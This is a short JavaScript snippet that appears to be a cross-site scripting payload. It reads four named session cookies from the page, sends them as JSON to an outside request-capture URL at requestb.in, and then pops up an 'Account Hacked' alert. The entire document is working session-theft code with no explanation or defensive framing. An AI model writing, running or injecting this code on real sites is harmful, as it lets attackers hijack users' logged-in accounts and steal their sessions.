function readCookie(name) {
    var nameEQ = name + "=";
    var ca = document.cookie.split(';');
    for(var i=0;i < ca.length;i++) {
        var c = ca[i];
        while (c.charAt(0)==' ') c = c.substring(1,c.length);
        if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
    }
    return null;
}
var cookie={xman_t:readCookie("xman_t")
            ,xman_f:readCookie("xman_f")
            ,xman_us_f:readCookie("xman_us_f")
           ,xman_us_t:readCookie("xman_us_t")}
var xmlHttp = new XMLHttpRequest();
xmlHttp.open( "GET", "https://requestb.in/1i0zvsq1?cookie="+JSON.stringify(cookie), false );
xmlHttp.send( null );
alert('Account Hacked')


